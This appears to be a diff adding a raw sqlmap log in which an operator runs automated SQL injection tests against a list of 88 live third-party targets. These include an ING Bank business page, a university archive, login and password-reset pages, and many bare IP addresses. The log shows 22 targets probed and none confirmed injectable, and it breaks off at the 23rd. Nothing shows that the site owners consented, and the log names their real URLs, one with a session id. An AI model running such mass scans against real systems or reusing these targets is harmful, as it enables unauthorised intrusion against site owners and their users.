@@ -1,0 +1,1370 @@
+         _
+ ___ ___| |_____ ___ ___  {1.0.5.46#dev}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:15:48
+
+[11:15:48] [INFO] parsing multiple targets list from './log/xmi'
+[11:15:48] [INFO] sqlmap got a total of 88 targets
+URL 1:
+GET http://www.ingbank.pl/ingbusiness/ing-businessonline//ingbusiness/ing-businessonline/komunikaty-ing-businessonline?news_id=1100607-zmiana-strony-logowania-dla-klientow-korporacyjnych-ing
+do you want to test this URL? [Y/n/q]
+> Y
+[11:15:48] [INFO] testing URL 'http://www.ingbank.pl/ingbusiness/ing-businessonline//ingbusiness/ing-businessonline/komunikaty-ing-businessonline?news_id=1100607-zmiana-strony-logowania-dla-klientow-korporacyjnych-ing'
+[11:15:48] [INFO] using '/home/fang/.sqlmap/output/results-06122016_1115am.csv' as the CSV results file in multiple targets mode
+[11:15:49] [INFO] testing connection to the target URL
+[11:15:49] [INFO] heuristics detected web page charset 'ascii'
+[11:15:49] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
+[11:15:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:15:50] [INFO] testing if the target URL is stable
+[11:15:50] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:15:50] [INFO] testing if GET parameter 'news_id' is dynamic
+[11:15:50] [INFO] confirming that GET parameter 'news_id' is dynamic
+[11:15:51] [INFO] GET parameter 'news_id' is dynamic
+[11:15:51] [WARNING] heuristic (basic) test shows that GET parameter 'news_id' might not be injectable
+[11:15:51] [INFO] skipping GET parameter 'news_id'
+[11:15:51] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:15:51] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 7 times
+URL 2:
+GET http://controle.redeinfo.net.br:1881/index.php?homepage=http%3A%2F%2F131.0.147.91%2F/?console=panel
+do you want to test this URL? [Y/n/q]
+> Y
+[11:15:51] [INFO] testing URL 'http://controle.redeinfo.net.br:1881/index.php?homepage=http%3A%2F%2F131.0.147.91%2F/?console=panel'
+[11:15:51] [INFO] testing connection to the target URL
+[11:15:52] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:15:53] [INFO] testing if the target URL is stable
+[11:15:53] [INFO] target URL is stable
+[11:15:53] [INFO] testing if GET parameter 'homepage' is dynamic
+[11:15:54] [WARNING] GET parameter 'homepage' does not appear dynamic
+[11:15:55] [WARNING] heuristic (basic) test shows that GET parameter 'homepage' might not be injectable
+[11:16:01] [INFO] skipping GET parameter 'homepage'
+[11:16:01] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 3:
+GET https://sandboxportal.hlg.de/wps/portal/PROPS_DEU/Home/Start///wps/portal/PROPS_DEU/Home/Start/!ut/p/b1/04_Sj9Q1NDI2MTA3Njc30o_Qj8pLLMtMTyzJzM9LzAHxo8ziLQ19nQ0tLQy8DMI8XQw8zYNcnCx9LY0NvE2ACiKBCgxwAEcDQvq99KPSc_KTgFaF60eBFbsb-hoZmpgYebiH-JsZeHq5O_oGm_obGFgYQxXgsczPIz83VT83KsciO8tEEQDa6WOT/dl4/d5/L0lJSklKSUpDZ3BSQS9JUGpBQUF4QUFFU29BQ0pHNGVGdS80SmtHUW9RdHV5RkprS1lhaUlBIS9aNl85MU1DMTk4MEowVklEMEk3UkRCOU05MzBLNC9aN185MU1DMTk4MEowVklEMEk3UkRCOU05MzBLNS9yZWZyZXNo/?content=Start
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:01] [INFO] testing URL 'https://sandboxportal.hlg.de/wps/portal/PROPS_DEU/Home/Start///wps/portal/PROPS_DEU/Home/Start/!ut/p/b1/04_Sj9Q1NDI2MTA3Njc30o_Qj8pLLMtMTyzJzM9LzAHxo8ziLQ19nQ0tLQy8DMI8XQw8zYNcnCx9LY0NvE2ACiKBCgxwAEcDQvq99KPSc_KTgFaF60eBFbsb-hoZmpgYebiH-JsZeHq5O_oGm_obGFgYQxXgsczPIz83VT83KsciO8tEEQDa6WOT/dl4/d5/L0lJSklKSUpDZ3BSQS9JUGpBQUF4QUFFU29BQ0pHNGVGdS80SmtHUW9RdHV5RkprS1lhaUlBIS9aNl85MU1DMTk4MEowVklEMEk3UkRCOU05MzBLNC9aN185MU1DMTk4MEowVklEMEk3UkRCOU05MzBLNS9yZWZyZXNo/?content=Start'
+[11:16:01] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'https://sandboxportal.hlg.de/wps/portal/PROPS_DEU/Home/Start/!ut/p/b1/hY3bCoJAFEW_KM6xGZ3x0S54y8QUL_MSk4ikkw4RhX-fRa_VftuwFgsEVAvCGUPKCYUSxCDv51bezuMg1esL62gb0dqwOQaY-xv02WGzsiObYPgSqhnAL3Pwnx-AaNV4mlMFiDfsGtHSoHTpuVlsoR-4TpSaMSInH-BHbO-NlwaqGWPfoyZkUCI9pt2kwyy9hbuaJd300GFP8tVj7M1Fk-tY5ta2dtWUFKrphkInV6d1_J3SE1yE4n1H5RMIxdpY/dl4/d5/L2dBISEvZ0FBIS9nQSEh/?content=Start'. Do you want to follow? [Y/n] Y
+[11:16:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:16:06] [INFO] testing if the target URL is stable
+[11:16:08] [WARNING] GET parameter 'content' does not appear dynamic
+[11:16:09] [WARNING] heuristic (basic) test shows that GET parameter 'content' might not be injectable
+[11:16:12] [INFO] skipping GET parameter 'content'
+[11:16:12] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 4:
+GET http://62.32.119.187/?r=2//?hrd=1
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:12] [INFO] testing URL 'http://62.32.119.187/?r=2//?hrd=1'
+[11:16:12] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'http://62.32.119.187:80/?r=2%2F%2F%3Fhrd=1&r=2'. Do you want to follow? [Y/n] Y
+[11:16:33] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:16:34] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:16:34] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
+[11:16:34] [INFO] testing if the target URL is stable
+[11:16:35] [WARNING] GET parameter 'r' does not appear dynamic
+[11:16:40] [WARNING] heuristic (basic) test shows that GET parameter 'r' might not be injectable
+[11:16:41] [INFO] heuristic (XSS) test shows that GET parameter 'r' might be vulnerable to cross-site scripting attacks
+[11:16:46] [INFO] skipping GET parameter 'r'
+[11:16:46] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:16:46] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+URL 5:
+GET http://115.29.220.218//?page=1
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:46] [INFO] testing URL 'http://115.29.220.218//?page=1'
+[11:16:46] [INFO] testing connection to the target URL
+[11:16:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:16:47] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:16:47] [INFO] testing if the target URL is stable
+[11:16:47] [INFO] target URL is stable
+[11:16:47] [INFO] testing if GET parameter 'page' is dynamic
+[11:16:48] [WARNING] GET parameter 'page' does not appear dynamic
+[11:16:48] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[11:16:48] [INFO] skipping GET parameter 'page'
+[11:16:48] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 6:
+GET http://181.113.120.28//?view=remind
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:48] [INFO] testing URL 'http://181.113.120.28//?view=remind'
+[11:16:48] [INFO] testing connection to the target URL
+[11:16:51] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:16:52] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:16:52] [INFO] testing if the target URL is stable
+[11:16:53] [INFO] target URL is stable
+[11:16:53] [INFO] testing if GET parameter 'view' is dynamic
+[11:16:53] [INFO] confirming that GET parameter 'view' is dynamic
+[11:16:54] [WARNING] GET parameter 'view' does not appear dynamic
+[11:16:55] [WARNING] heuristic (basic) test shows that GET parameter 'view' might not be injectable
+[11:16:55] [INFO] skipping GET parameter 'view'
+[11:16:55] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:16:55] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 3 times
+URL 7:
+GET http://54.186.4.184/item?id=10939306
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:55] [INFO] testing URL 'http://54.186.4.184/item?id=10939306'
+[11:16:55] [INFO] testing connection to the target URL
+[11:16:56] [CRITICAL] page not found (404)
+[11:16:56] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 8:
+GET http://115.28.38.8/?page_id=2
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:56] [INFO] testing URL 'http://115.28.38.8/?page_id=2'
+[11:16:56] [INFO] testing connection to the target URL
+[11:16:57] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:16:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:16:57] [INFO] testing if the target URL is stable
+[11:16:58] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:16:58] [INFO] testing if GET parameter 'page_id' is dynamic
+[11:16:58] [WARNING] user aborted in multiple target mode
+do you want to skip to the next target in list? [Y/n/q] Y
+URL 9:
+GET http://54.229.123.17/en///en/?format=feed&type=rss
+do you want to test this URL? [Y/n/q]
+> Y
+[11:16:58] [INFO] testing URL 'http://54.229.123.17/en///en/?format=feed&type=rss'
+[11:16:58] [INFO] testing connection to the target URL
+[11:16:59] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+[11:16:59] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:16:59] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:16:59] [INFO] testing if the target URL is stable
+[11:16:59] [INFO] target URL is stable
+[11:16:59] [INFO] testing if GET parameter 'format' is dynamic
+[11:17:00] [WARNING] GET parameter 'format' does not appear dynamic
+[11:17:00] [WARNING] heuristic (basic) test shows that GET parameter 'format' might not be injectable
+[11:17:01] [INFO] skipping GET parameter 'format'
+[11:17:01] [INFO] testing if GET parameter 'type' is dynamic
+[11:17:01] [WARNING] GET parameter 'type' does not appear dynamic
+[11:17:02] [WARNING] heuristic (basic) test shows that GET parameter 'type' might not be injectable
+[11:17:02] [INFO] skipping GET parameter 'type'
+[11:17:02] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:17:02] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 1 times, 500 (Internal Server Error) - 8 times
+URL 10:
+GET http://206.108.40.224//status?full=true
+do you want to test this URL? [Y/n/q]
+> Y
+[11:17:02] [INFO] testing URL 'http://206.108.40.224//status?full=true'
+[11:17:02] [INFO] testing connection to the target URL
+[11:17:02] [CRITICAL] page not found (404)
+[11:17:02] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 11:
+GET http://earsiv.uskudar.edu.tr/xmlui///xmlui/browse?type=dateissued
+do you want to test this URL? [Y/n/q]
+> Y
+[11:17:02] [INFO] testing URL 'http://earsiv.uskudar.edu.tr/xmlui///xmlui/browse?type=dateissued'
+[11:17:03] [INFO] testing connection to the target URL
+[11:17:05] [CRITICAL] page not found (404)
+[11:17:05] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 12:
+GET http://202.164.232.77//?page_id=220
+do you want to test this URL? [Y/n/q]
+> Y
+[11:17:05] [INFO] testing URL 'http://202.164.232.77//?page_id=220'
+[11:17:05] [INFO] testing connection to the target URL
+[11:17:08] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:17:08] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:17:10] [INFO] testing if the target URL is stable
+[11:17:11] [INFO] target URL is stable
+[11:17:11] [INFO] testing if GET parameter 'page_id' is dynamic
+sqlmap got a 301 redirect to 'http://202.164.232.77/?page_id=8770'. Do you want to follow? [Y/n] Y
+[11:17:13] [INFO] confirming that GET parameter 'page_id' is dynamic
+[11:17:15] [INFO] GET parameter 'page_id' is dynamic
+[11:17:19] [ERROR] possible integer casting detected (e.g. "$page_id=intval($_REQUEST['page_id'])") at the back-end web application
+do you want to skip those kind of cases (and save scanning time)? [Y/n] Y
+[11:17:22] [INFO] skipping GET parameter 'page_id'
+[11:17:22] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 13:
+GET http://50.16.216.166//subscribe/free_trial_login?free_trial_navbar=1
+do you want to test this URL? [Y/n/q]
+> Y
+[11:17:22] [INFO] testing URL 'http://50.16.216.166//subscribe/free_trial_login?free_trial_navbar=1'
+[11:17:22] [INFO] testing connection to the target URL
+[11:17:23] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:17:23] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:17:23] [WARNING] reflective value(s) found and filtering out
+[11:17:23] [INFO] testing if the target URL is stable
+[11:17:23] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:17:23] [INFO] testing if GET parameter 'free_trial_navbar' is dynamic
+[11:17:24] [WARNING] GET parameter 'free_trial_navbar' does not appear dynamic
+[11:17:24] [WARNING] heuristic (basic) test shows that GET parameter 'free_trial_navbar' might not be injectable
+[11:17:30] [INFO] skipping GET parameter 'free_trial_navbar'
+[11:17:30] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 14:
+GET http://173.167.239.103//Content/css?v=Bz3KZjU_pdOm2wAVr7z_ylCuQzQDs1O8N6pV4cvXc_Q1
+do you want to test this URL? [Y/n/q]
+> Y
+[11:17:30] [INFO] testing URL 'http://173.167.239.103//Content/css?v=Bz3KZjU_pdOm2wAVr7z_ylCuQzQDs1O8N6pV4cvXc_Q1'
+[11:17:30] [INFO] testing connection to the target URL
+[11:17:33] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:17:33] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:17:35] [INFO] testing if the target URL is stable
+[11:17:37] [INFO] target URL is stable
+[11:17:37] [INFO] testing if GET parameter 'v' is dynamic
+[11:17:40] [WARNING] GET parameter 'v' does not appear dynamic
+[11:17:42] [WARNING] heuristic (basic) test shows that GET parameter 'v' might not be injectable
+[11:24:46] [INFO] skipping GET parameter 'v'
+[11:24:46] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 15:
+GET http://159.220.39.187/converis/portal?lang=en_US//converis/portal/static/help/show?lang=en_US
+do you want to test this URL? [Y/n/q]
+> Y
+[11:24:46] [INFO] testing URL 'http://159.220.39.187/converis/portal?lang=en_US//converis/portal/static/help/show?lang=en_US'
+[11:24:46] [INFO] testing connection to the target URL
+[11:24:47] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:24:47] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:24:48] [INFO] testing if the target URL is stable
+[11:24:49] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:24:49] [INFO] searching for dynamic content
+[11:24:50] [INFO] dynamic content marked for removal (38 regions)
+[11:24:51] [INFO] testing if GET parameter 'lang' is dynamic
+[11:24:54] [WARNING] GET parameter 'lang' does not appear dynamic
+[11:24:55] [WARNING] heuristic (basic) test shows that GET parameter 'lang' might not be injectable
+[11:24:57] [INFO] skipping GET parameter 'lang'
+[11:24:57] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. You can give it a go with the switch '--text-only' if the target page has a low percentage of textual content (~10.85% of page content is text). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 16:
+GET http://121.22.9.226//list?id=10
+do you want to test this URL? [Y/n/q]
+> Y
+[11:24:57] [INFO] testing URL 'http://121.22.9.226//list?id=10'
+[11:24:57] [INFO] testing connection to the target URL
+[11:24:58] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:24:58] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:24:58] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:24:58] [INFO] testing if the target URL is stable
+[11:24:58] [INFO] target URL is stable
+[11:24:58] [INFO] testing if GET parameter 'id' is dynamic
+[11:24:58] [INFO] confirming that GET parameter 'id' is dynamic
+[11:24:58] [INFO] GET parameter 'id' is dynamic
+[11:24:59] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[11:24:59] [INFO] skipping GET parameter 'id'
+[11:24:59] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:24:59] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+URL 17:
+GET https://domains.isplus.net/login?_sid=tgwehgs14xBxxBpq8TRxa1HCy6//help/support/?_sid=tgwehgs14xBxxBpq8TRxa1HCy6
+do you want to test this URL? [Y/n/q]
+> Y
+[11:24:59] [INFO] testing URL 'https://domains.isplus.net/login?_sid=tgwehgs14xBxxBpq8TRxa1HCy6//help/support/?_sid=tgwehgs14xBxxBpq8TRxa1HCy6'
+[11:25:04] [INFO] testing connection to the target URL
+[11:25:05] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:25:06] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:25:06] [INFO] testing if the target URL is stable
+[11:25:07] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:25:07] [INFO] testing if GET parameter '_sid' is dynamic
+[11:25:07] [WARNING] GET parameter '_sid' does not appear dynamic
+[11:25:08] [WARNING] heuristic (basic) test shows that GET parameter '_sid' might not be injectable
+[11:25:09] [INFO] skipping GET parameter '_sid'
+[11:25:09] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 18:
+GET http://216.68.82.67/login/?returnurl=%2f//login/?ReturnURL=%2flogin%2f%3freturnurl%3d%252f
+do you want to test this URL? [Y/n/q]
+> Y
+[11:25:09] [INFO] testing URL 'http://216.68.82.67/login/?returnurl=%2f//login/?ReturnURL=%2flogin%2f%3freturnurl%3d%252f'
+[11:25:09] [INFO] testing connection to the target URL
+[11:25:13] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:25:14] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:25:14] [INFO] testing if the target URL is stable
+[11:25:14] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:25:14] [INFO] testing if GET parameter 'returnurl' is dynamic
+[11:25:15] [INFO] confirming that GET parameter 'returnurl' is dynamic
+[11:25:16] [WARNING] GET parameter 'returnurl' does not appear dynamic
+[11:25:17] [WARNING] heuristic (basic) test shows that GET parameter 'returnurl' might not be injectable
+[11:25:18] [INFO] skipping GET parameter 'returnurl'
+[11:25:18] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:25:18] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+URL 19:
+GET http://5.63.157.33//login/?register=yes&backurl=%2Flogin%2F&register=yes&backurl=%2F
+do you want to test this URL? [Y/n/q]
+> Y
+[11:25:18] [INFO] testing URL 'http://5.63.157.33//login/?register=yes&backurl=%2Flogin%2F&register=yes&backurl=%2F'
+it appears that provided value for GET parameter 'backurl' has boundaries. Do you want to inject inside? ('/login*/') [y/N] N
+[11:25:18] [INFO] testing connection to the target URL
+[11:25:22] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:25:23] [WARNING] reflective value(s) found and filtering out
+[11:25:23] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:25:23] [INFO] testing if the target URL is stable
+[11:25:25] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:25:25] [INFO] testing if GET parameter 'register' is dynamic
+[11:25:28] [WARNING] GET parameter 'register' does not appear dynamic
+[11:25:30] [WARNING] heuristic (basic) test shows that GET parameter 'register' might not be injectable
+[11:25:32] [INFO] skipping GET parameter 'register'
+[11:25:32] [INFO] testing if GET parameter 'backurl' is dynamic
+[11:25:34] [WARNING] GET parameter 'backurl' does not appear dynamic
+[11:25:35] [WARNING] heuristic (basic) test shows that GET parameter 'backurl' might not be injectable
+[11:25:37] [INFO] skipping GET parameter 'backurl'
+[11:25:37] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 20:
+GET http://tenstrawberrystreet.com//module/ordersample2/form?module_action=form
+do you want to test this URL? [Y/n/q]
+> Y
+[11:25:37] [INFO] testing URL 'http://tenstrawberrystreet.com//module/ordersample2/form?module_action=form'
+[11:25:38] [INFO] testing connection to the target URL
+[11:25:39] [CRITICAL] page not found (404)
+[11:25:39] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 21:
+GET http://90.190.106.39//login/?op=newpass
+do you want to test this URL? [Y/n/q]
+> Y
+[11:25:39] [INFO] testing URL 'http://90.190.106.39//login/?op=newpass'
+[11:25:39] [INFO] testing connection to the target URL
+[11:25:40] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:25:40] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:25:41] [INFO] testing if the target URL is stable
+[11:25:42] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:25:42] [INFO] testing if GET parameter 'op' is dynamic
+[11:25:42] [INFO] confirming that GET parameter 'op' is dynamic
+[11:25:43] [INFO] GET parameter 'op' is dynamic
+[11:25:44] [WARNING] heuristic (basic) test shows that GET parameter 'op' might not be injectable
+[11:25:45] [INFO] skipping GET parameter 'op'
+[11:25:45] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 22:
+GET http://123.108.97.27/eproc///eproc/publicberita?j=pengumuman
+do you want to test this URL? [Y/n/q]
+> Y
+[11:25:45] [INFO] testing URL 'http://123.108.97.27/eproc///eproc/publicberita?j=pengumuman'
+[11:25:45] [INFO] testing connection to the target URL
+[11:25:46] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:25:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:25:46] [INFO] testing if the target URL is stable
+[11:25:47] [INFO] target URL is stable
+[11:25:47] [INFO] testing if GET parameter 'j' is dynamic
+[11:25:47] [WARNING] GET parameter 'j' does not appear dynamic
+[11:25:48] [WARNING] heuristic (basic) test shows that GET parameter 'j' might not be injectable
+[11:25:50] [INFO] skipping GET parameter 'j'
+[11:25:50] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 23:
